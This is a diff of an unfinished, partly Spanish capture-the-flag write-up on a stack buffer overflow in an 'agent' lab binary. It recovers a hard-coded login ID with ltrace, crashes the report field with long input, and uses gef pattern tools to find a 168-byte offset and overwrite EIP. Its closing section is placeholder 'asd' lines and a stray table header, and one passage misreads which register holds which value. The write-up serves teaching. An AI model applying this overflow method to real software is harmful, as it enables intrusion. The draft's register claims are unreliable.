@@ -1720,7 +1720,9 @@ fabc1afd43f668df0b812213567d032c  agent
 www-data@imf:/usr/local/bin$  
 
 ```
-let's do the precheck 
+let's do the BufferOverFlow precheck
+
+before to do it let's check the proc ---------------------------------------------------------------------------------------------------------
 
 ```bash 
 ❯ ltrace ./agent
@@ -1747,9 +1749,9 @@ puts("Invalid Agent ID "Invalid Agent ID
 ```
 important output ```strncmp("hola\n", "48093572", 8) ```
 
-seems that our input  is comparing to ```48093572``` let add this comparasison instead of hola 
+seems that our input  is comparing to ```48093572``` let's add this comparasison instead of hola 
 
-and we have access 
+and we have access to the app
 
 ```bash 
 ❯ ./agent
@@ -1769,11 +1771,9 @@ Main Menu:
 Enter selection: 
 ```
 
-let's continue doing the precheck 
+let's continue doing the precheck, first of all we need to find where we could be able to add as much A's to currpt the program
 
 ```bash 
-1
-
 output 
 
 ❯ ./agent
@@ -1804,7 +1804,7 @@ Ashton Park, Mosman, Sydney, New South Wales, Australia
 Argyle Place, The Rocks, Sydney, New South Wales, Australia
 ```
 
-we don't are able to add code here the 2ndo one is not vulneral
+we don't are able to add code here the 2ndo one is not vulneral at BOF
 
 ```bash 
 ❯ ./agent
@@ -1858,24 +1858,75 @@ zsh: segmentation fault  ./agent
 
 ```
 
-seems that it has the vulnerability lets use gef to check the eip + ESP 
+
+seems that it has the vulnerability BOF because the output appeard ```zsh: segmentation fault  ./agent```
+
+but how i know it ? 
+
+
+let me explain you or let me introduce you to BOF
+
+primero que todo debemos conocer un poco de como funcionan los programas, esto con la finalidad de comprender como es que se acontece el BOF
+
+primero usando el mismo escenario de el binario agent, nosotros metimos tantas A's que hicieron que apareciera segmentation fault verdad ? 
+
+pero esto pasa porque por ejemplo nosotros metimos A's donde nos dejaba que seria aqui 
+
+```3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update:
+```
+
+donde nos dejaba meter input verdad ? pues este input que nos dejaba meter se llama ESP que es la pila donde nos deja meter nuestro input 
+entonces como nosotros metimos tantas AAAAAAA's se vieron afectados el EBP y el EIP  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 
 ```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|AAAAAAAAAAAAAAAAAAAAA|AAAAAAAAAAAA| 
++------------------------------------+---------------------+------+-----+
+
+```
+Pero como la aplicacion interpreta la A en hexadecimal entonces en lugar de que el EBP y el EIP valgan A valdria \x41, la pila si va a valer el input nuestro porque es un lugar al que si podriamos meter nuestro input el hecho de que nos deje escribir en el EIP hace que el programa se corrompa porque EIP es el instruccion Pointer o sea seria como el que manda para donde va el flujo del programa pensemos como que EIP seria el flautista de hamelín y este flautista diga para donde quiere mover esos ratones que con su musica estan encantados, pues aqui igual el EIP dice para donde ira el programa pero como nosotros agregamos A's entonces EIP no sabe para donde ir porque una A no es una direccion 
+
+
+
+tomando el ejemplo anterior y para darle mas enfasis a lo que dijimos representado seria asi
+
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++------------------------------------+---------------------+------+-----+
+```
+- pero quizas el hecho de que habimos dicho, que la A estaria representado en hexadecimal, seria asi \x41 y que tu veas en el ejemplo menos representaciones 
+de A o sea veas menos \x41, pues esto es solo un ejemplo si tu agregas 100 A's pues seran 100 representaciones de A o sea 100 \x41
+
+
+
+Entonces como habiamos dicho la idea es que como logramos meter input al EIP podriamos manipular el EIP pero para esto tendremos que medir cuantos caracteres necesitamos meter para alcanzar el EIP para esto vamos a jugar con gdb gef que es una herramienta de analisis a bajo nivel esto quiere decir que es una herramienta para analisis de codigo maquina tambien podriamos usar peda o usar ghidra en mi caso usare gdb
+
+le damos a gdb + el binario + q
+
+```bash 
 ❯ gdb agent -q
+
+
 GEF for linux ready, type `gef' to start, `gef config' to configure
 90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.01ms using Python engine 3.9
 Reading symbols from agent...
 (No debugging symbols found in agent)
 ```
-
-asd
-
+ahora debemos correr el programa 
 
 ```bash 
 gef➤  r
-
 ```
+
+output | el programa va a parecer que se corrio normalmente pero por detras esta gef analizando todo lo que se ejecuta por detras 
 
 ```bash 
 Starting program: /home/z3kk3n/Desktop/imf/agent 
@@ -1889,7 +1940,31 @@ Starting program: /home/z3kk3n/Desktop/imf/agent
 Agent ID : 
 
 ```
-asdasd
+
+vamos a usar los mismos pasos que usamos antes para corromper la aplicacion y que se aplique el segmentation fault 
+
+
+```bash 
+```bash 
+❯ ./agent
+  ___ __  __ ___ 
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated 
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+look the output
 
 ```bash 
 [ Legend: Modified register | Code | Heap | Stack | String ]
@@ -1923,9 +1998,16 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
 ```
-as you can see ```$eip   : 0x41414141 ("AAAA"?)``` values AAAA and ESP ```$esp   : 0xffffd3f0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"``` values AAA..
+aqui tenemos la habilidad de analizar todo con mas detalles porque ya con solo ver esto vemos lo que sobre escribimos tanto el eip $eip   : 0x41414141 ("AAAA"?)  como el ebp $ebp   : 0x41414141 ("AAAA"?)
 
-lets create a pattern create of make a script 
+
+entonces la idea es medir para poder usar el EIP a nuestro antojo verdad ?
+
+
+pues simplemente vamos a crear un patron con la misma herramienta que se llama gef para meter ese patron en el ESP o en la pila, para luego contar cuantos caracteres tenemos que agregar hasta que llegamos a alcanzar el EIP o el instruction pointer 
+
+
+para esto vamos jugar con un parametro que se llama create patten 
 
 ```bash 
 gef➤  pattern create
@@ -1933,11 +2015,196 @@ gef➤  pattern create
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
 
 ```
-now we have to run it and add in 3rd line 
+
+ahora la idea es agregar este patron en el input del binario o sea en lugar de las  A's agregamos el patron esto para determinar los valores EIP y EBP 
+entonces ejecutamos el programa con gdb como cuando queriamos ver los valores con el gef
+
+entonces ```gdb agent -q``` luego ```r``` para correr el programa ```3``` para seleccionar el campo vulnerable ```input``` aqui metermos nuestro pattern create
+
+output
+```bash 
+$eax   : 0xffffd344  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
+$ebx   : 0x0       
+$ecx   : 0xffffffff
+$edx   : 0xffffffff
+$esp   : 0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"
+$ebp   : 0x62616171 ("qaab"?)
+$esi   : 0xf7fa7000  →  0x001e4d6c
+$edi   : 0xf7fa7000  →  0x001e4d6c
+$eip   : 0x62616172 ("raab"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd3f0│+0x0000: "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"	← $esp
+0xffffd3f4│+0x0004: "taabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacga[...]"
+0xffffd3f8│+0x0008: "uaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaacha[...]"
+0xffffd3fc│+0x000c: "vaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaacia[...]"
+0xffffd400│+0x0010: "waabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacja[...]"
+0xffffd404│+0x0014: "xaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacka[...]"
+0xffffd408│+0x0018: "yaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaacla[...]"
+0xffffd40c│+0x001c: "zaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x62616172
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "agent", stopped 0x62616172 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+como podemos ver ahora $eip vale 0x62616171 ("qaab"?) y el esp vale todo esto $esp   : 0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"
+
+una representacion grafica seria 
+
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+-----+-----+----+
+| aaaabaaacaaadaaaeaaafaaagaaahaaaia |\x61\x61\x62\x74\x61\|\x71\x61\x61\x62| 
++------------------------------------+---------------------+----+-----+-----+
+```
+donde $eip vale 0x62616171 ("qaab"?) que en hexadecimal seria \x71\x61\x61\x62  y el esp vale todo esto $esp   : 0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]" que en hexadecimal seria \x61\x61\x62\x74\x61\...
+
+
+entonces la idea ahora es preguntarle a gef cuantos caracteres se necesitan para alcanzar eip 
+
+esto lo haremos con pattern offset  ejm
+
+```bash
+gef➤  pattern offset $eip
+[+] Searching for '$eip'
+[+] Found at offset 168 (little-endian search) likely
+gef➤  
+
+```
+entonces nos dice que tenemos que meter 168 caracteres para llegar a eip podriamos corroborarlo haciendo un oneline en python3 
+
+multiplicando valores como sabemos eip su valor es 4 porque en el gef nos salian 4 caracteres reecuerdas ? ("qaab"?) entonces le diremos 
+
+multiplicame 168 por que son las que necesitamos para alcanzar eip luego multiplicame 4 B para escribir en el EIP y luego muultipliquemos 100 c' porque siempre es 
+
+bueno saber donde se almacenan otros valores en este caso pondremos 100 c's 
+
+```bash 
+❯ python3 -c 'print ("A"*168 + "B"*4 + "C"*100)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+```
+
+ahora la idea es correr el programa nuevamente o sea tendriamos que hacer un quit a gdb y correrlo de nuevo para meter nuestro pattern offset creado con python
+```bash 
+gef➤  quit
+```
+entonces ```gdb agent -q``` luego ```r``` para correr el programa ```3``` para seleccionar el campo vulnerable ```input``` aqui metermos nuestro pattern create
+
+output
+```bash
+$eax   : 0xffffd344  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebx   : 0x0       
+$ecx   : 0xffffffff
+$edx   : 0xffffffff
+$esp   : 0xffffd3f0  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0xf7fa7000  →  0x001e4d6c
+$edi   : 0xf7fa7000  →  0x001e4d6c
+$eip   : 0x42424242 ("BBBB"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd3f0│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
+0xffffd3f4│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd3f8│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd3fc│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd400│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd404│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd408│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd40c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "agent", stopped 0x42424242 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+```
+
+entonces como vemos si esta bien , es mas vamos a representarlo graficamente para que entiendas mejor 
+la idea es que eax vale nuestras A's y C ahora vale la pila el ESP ya sabemos donde esta cada cosa 
+
+
+$eax   : 0xffffd344  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+
+ahora eip vale BBBB
+
+$eip   : 0x42424242 ("BBBB"?)
+
+$esp   : 0xffffd3f0  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
 
 
 ```bash 
-
-
+ 
+ Eax     |    ESP                      |       EBP           | EIP
++--------+-----------------------------+---------------------+------+-----+
+| AAAAAAA|CCCCCCCCCCCCCCCCCCCCCCCCCCCCC|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++--------+-----------------------------+---------------------+------+-----+
 ```
+entonces la idea ahora es como anteriormente hablamos de la aletorizacion debido al proc 
+
+
+asd
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++------------------------------------+---------------------+------+-----+
+```
+asd
+
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++------------------------------------+---------------------+------+-----+
+```
+asd
+
+
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++------------------------------------+---------------------+------+-----+
+```
+asd
+
+
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++------------------------------------+---------------------+------+-----+
+```
+asd
+
+
+```bash 
+        ESP                          |       EBP           | EIP
++------------------------------------+---------------------+------+-----+
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
++------------------------------------+---------------------+------+-----+
+```
+asd
+
+```bash 
++---------------------+---------------------+------+-----+---------------------+----------------+
+| Field               | Type                | Null | Key | Default             | Extra          |
++---------------------+---------------------+------+-----+---------------------+----------------+
+```
+asd
+```bash 
++---------------------+---------------------+------+-----+---------------------+----------------+
+| Field               | Type                | Null | Key | Default             | Extra          |
++---------------------+---------------------+------+-----+---------------------+----------------+
+```
+
+
+
 i am still working on it ...
